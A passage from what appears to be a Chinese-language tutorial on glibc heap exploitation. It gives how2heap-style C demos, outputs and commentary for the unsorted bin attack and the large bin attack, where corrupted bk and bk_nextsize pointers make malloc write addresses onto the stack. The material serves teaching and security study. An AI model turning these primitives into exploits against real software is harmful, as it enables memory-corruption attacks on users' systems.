Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem
Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160
malloc(0x100): 0x7ffe82ca7160
</code></pre><p>首先分配一个 0x100 的 chunk<code>victim</code>，在下面再垫一个 chunk 防止与 top chunk 合并，释放 <code>victim</code> 进入 unsorted bin。现在在栈上伪造大小为 <code>0x110</code> 的 chunk，并使其 <code>bk</code> 指向任意一个可写地址，比如自身。</p><p>假设存在漏洞可以修改 <code>victim</code> 的 <code>chunk_size</code> 和 <code>bk</code>，那么我们可以将它的 <code>chunk_size</code> 改为合法 <code>nextsize</code> 范围内的一个值，且小于 0x100。而 <code>bk</code> 则改为我们刚才伪造的 chunk。这样下一次 <code>malloc(0x100)</code> 就会顺着 <code>bk</code> 查找，首先找到 <code>victim</code> 但大小不够，放入 small bin。随后找到我们伪造的 chunk 并返回，此时伪造 chunk 的 <code>fd</code> 已经指向 <code>main_arena+88</code>，可以借此泄露 libc。</p><h2 id=unsorted_bin_attack class="relative group">unsorted_bin_attack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#unsorted_bin_attack aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;global variable global_max_fast in libc for further fastbin attack</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s first look at the target we want to rewrite on stack:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%p: %ld</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>,</span> <span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p</span><span class=o>=</span><span class=nf>malloc</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate first normal chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another normal chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the first one during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;point to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=o>-</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;rewritten:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%p: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let&#39;s first look at the target we want to rewrite on stack:
0x7fff4c4511e8: 0

Now, we allocate first normal chunk on the heap at: 0x1023010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78
Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8

Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
0x7fff4c4511e8: 0x7f60208a2b78
</code></pre><p>和上一个类似，我们看到在 <code>free(p1)</code> 后，其 <code>bk</code> 指向 <code>main_arena+88</code>。假设存在漏洞可以修改其 <code>bk</code>，那么我们修改成目标地址 - 0x10 的位置，相当于伪造了一个 fake chunk。那么我们在拿回 <code>p1</code> 的时候，我们的 fake chunk 会被认为是 unsorted bin 中的下一个 chunk，因此其 <code>bk</code> 也被修改为 <code>main_arena+88</code>，于是我们在栈上写入了一个 <code>unsigned long</code> 值。</p><h2 id=large_bin_attack class="relative group">large_bin_attack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#large_bin_attack aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm>    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>              else
</span></span></span><span class=line><span class=cl><span class=cm>              {
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;fd_nextsize = fwd;
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
</span></span></span><span class=line><span class=cl><span class=cm>                  fwd-&gt;bk_nextsize = victim;
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
</span></span></span><span class=line><span class=cl><span class=cm>              }
</span></span></span><span class=line><span class=cl><span class=cm>              bck = fwd-&gt;bk;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    mark_bin (av, victim_index);
</span></span></span><span class=line><span class=cl><span class=cm>    victim-&gt;bk = bck;
</span></span></span><span class=line><span class=cl><span class=cm>    victim-&gt;fd = fwd;
</span></span></span><span class=line><span class=cl><span class=cm>    fwd-&gt;bk = victim;
</span></span></span><span class=line><span class=cl><span class=cm>    bck-&gt;fd = victim;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    For more details on how large-bins are handled and sorted by ptmalloc,
</span></span></span><span class=line><span class=cl><span class=cm>    please check the Background section in the aforementioned link.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates large bin attack by writing a large unsigned long value into stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;global variable global_max_fast in libc for further fastbin attack</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var2</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s first look at the targets we want to rewrite on stack:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var1 (%p): %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var1</span><span class=p>,</span> <span class=n>stack_var1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var2 (%p): %ld</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var2</span><span class=p>,</span> <span class=n>stack_var2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x320</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate the first large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the first large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Then, we allocate the second large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the second large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Finally, we allocate the third large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the third large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;[%p &lt;--&gt; %p ]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>),</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p2</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x90</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;[%p]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=mh>0x90</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;[%p &lt;--&gt; %p ]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>),</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p3</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s </span><span class=se>\&#34;</span><span class=s>size</span><span class=se>\&#34;</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;as well as its </span><span class=se>\&#34;</span><span class=s>bk</span><span class=se>\&#34;</span><span class=s>and </span><span class=se>\&#34;</span><span class=s>bk_nextsize</span><span class=se>\&#34;</span><span class=s>pointers</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;at the head of the large bin freelist. To overwrite the stack variables, we set </span><span class=se>\&#34;</span><span class=s>bk</span><span class=se>\&#34;</span><span class=s>to 16 bytes before stack_var1 and&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;</span><span class=se>\&#34;</span><span class=s>bk_nextsize</span><span class=se>\&#34;</span><span class=s>to 32 bytes before stack_var2</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x3f1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var2</span> <span class=o>-</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x90</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;During this time, targets should have already been rewritten:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var1 (%p): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var1</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>stack_var1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var2 (%p): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var2</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>stack_var2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates large bin attack by writing a large unsigned long value into stack
In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let&#39;s first look at the targets we want to rewrite on stack:
stack_var1 (0x7fff33530b00): 0
stack_var2 (0x7fff33530b08): 0

Now, we allocate the first large chunk on the heap at: 0xef3000
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()

Then, we allocate the second large chunk on the heap at: 0xef3360
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()

Finally, we allocate the third large chunk on the heap at: 0xef37a0
And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()

We free the first and second large chunks now and they will be inserted in the unsorted bin: [0xef3360 &lt;--&gt; 0xef3000 ]

Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [0xef30a0]

Now, we free the third large chunk and it will be inserted in the unsorted bin: [0xef37a0 &lt;--&gt; 0xef30a0 ]

Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s&#34;size&#34;as well as its&#34;bk&#34;and&#34;bk_nextsize&#34; pointers
Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set &#34;bk&#34; to 16 bytes before stack_var1 and &#34;bk_nextsize&#34; to 32 bytes before stack_var2

Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
stack_var1 (0x7fff33530b00): 0xef37a0
stack_var2 (0x7fff33530b08): 0xef37a0
</code></pre><p>这种攻击方法在 glibc 2.29 推出，unsorted bin attack 失效之后可能会有大的用武之地。</p><p>首先分配了一个 small chunk <code>p1</code>，然后分配了 2 个 large chunk <code>p2</code> 和 <code>p3</code>。在每个 chunk 后面都插一小段 fast chunk 防止合并。释放掉 <code>p1</code> 和 <code>p2</code>，两者都会进入 unsorted bin。</p><p>随后申请比 <code>p1</code> 小的 chunk，这一步比较复杂：</p><ol><li>从 unsorted bin 末尾拿出 <code>p1</code>，放入对应 small bin</li><li>从 unsorted bin 末尾拿出 <code>p2</code>，由于 large bin 为空，直接放入对应 large bin</li><li>unsorted bin 已经空了，于是从 small bin 中拿出 <code>p1</code>，切割 0x90 的 chunk 返回给程序</li><li><code>p1</code> 被切割剩下的部分 <code>_p1</code> 重新回到 unsorted bin</li></ol><p>再释放 <code>p3</code>，也进入 unsorted bin。这时，large bin 中有 <code>p2</code> 一个 chunk，大小为 0x410；unsorted bin 中有 <code>p3</code>，<code>_p1</code> 两个 chunk，大小分别为 0x410,0x290（0x330-0xa0）。</p><p>现在假设能控制整个 <code>p2</code> 的内容，让它的 <code>chunk_size=0x3f1</code>，<code>bk=addr1</code> 且 <code>bk_nextsize=addr2</code>。那么再次申请 small chunk 时：</p><ol><li>从 unsorted bin 末尾拿出 <code>_p1</code>，放入对应 small bin</li><li>从 unsorted bin 末尾拿出 <code>p3</code>，准备放入对应 large bin，但是对应 large bin 非空</li><li>从对应 large bin 第一个 chunk（<code>p2</code>）开始遍历，由于 <code>p2</code> 大小被修改，<code>0x3f0 &lt; 0x410</code>，所以 <code>p3</code> 插入到了链表头。</li></ol><p>插入的代码是这样的，注意这里没有检查 <code>bk_nextsize</code> 的合法性：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>size</span> <span class=o>==</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Always insert in the second position.  */</span>
</span></span><span class=line><span class=cl>  <span class=n>fwd</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>bck</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>
